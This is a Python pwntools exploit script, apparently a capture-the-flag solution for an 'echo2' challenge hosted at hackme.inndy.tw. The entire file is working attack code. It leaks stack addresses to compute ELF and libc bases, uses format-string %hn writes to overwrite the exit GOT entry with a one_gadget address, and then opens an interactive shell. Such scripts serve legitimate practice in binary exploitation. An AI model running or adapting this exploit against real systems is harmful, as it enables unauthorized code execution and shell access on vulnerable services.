#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
from time import sleep
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == 'l':
    io = process("./echo2", env = {"LD_PRELOAD": "./libc-2.23.so.x86_64"})
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc = ELF("./libc-2.23.so.x86_64")
    elf = ELF("./echo2")
    one_gadget = 0x3f2d6
    libc_offset = 0x00000000000201c0
    exit_got = elf.got["exit"]
else:
    io = remote("hackme.inndy.tw", 7712)
    libc = ELF("./libc-2.23.so.x86_64")
    elf = ELF("./echo2")
    one_gadget = 0x45206
    libc_offset = 0x0000000000020740 #objdump -D ./libc-2.23.so.x86_64 | grep __libc_start_main -m 1
    exit_got = elf.got["exit"]

def getAddr():
    io.sendline("%41$p..%43$p..")
    elf_base = int(io.recvuntil("..", drop = True), 16) - 74 - 0x9b9#nm ./echo2
    libc_base = int(io.recvuntil("..", drop = True), 16) - 240 - libc_offset # this is for remote
    #  libc_base = int(io.recvuntil("..", drop = True), 16) - 241 - libc_offset #this is for local
    log.info("elf_base -> 0x%x" % elf_base)
    log.info("libc_base -> 0x%x" % libc_base)
    return elf_base + exit_got, libc_base + one_gadget

def fmt(target, bullet):
    log.info("write 0x%x to 0x%x" % (bullet, target))
    #  payload = fmtstr_payload(6, {target: bullet}, write_size = "short")

    payload = ("%" + str(bullet & 0xffff) + "c%8$hn").ljust(16, ".") + p64(target)
    io.sendline(payload)
    io.recv()
    sleep(0.5)

    payload = ("%" + str(bullet >> 16 & 0xffff) + "c%8$hn").ljust(16, ".") + p64(target + 2)
    io.sendline(payload)
    io.recv()
    sleep(0.5)

    payload = ("%" + str(bullet >> 32 & 0xffff) + "c%8$hn").ljust(16, ".") + p64(target + 4)
    gdb.attach(io)
    io.sendline(payload)
    io.recv()
    sleep(0.5)

def getShell():
    io.sendline("exit")
    sleep(0.5)
    io.recvuntil("Goodbye\n")
    io.interactive()
    io.close()

if __name__ == "__main__":
    exit_got, one_gadget = getAddr()
    fmt(exit_got, one_gadget)
    getShell()
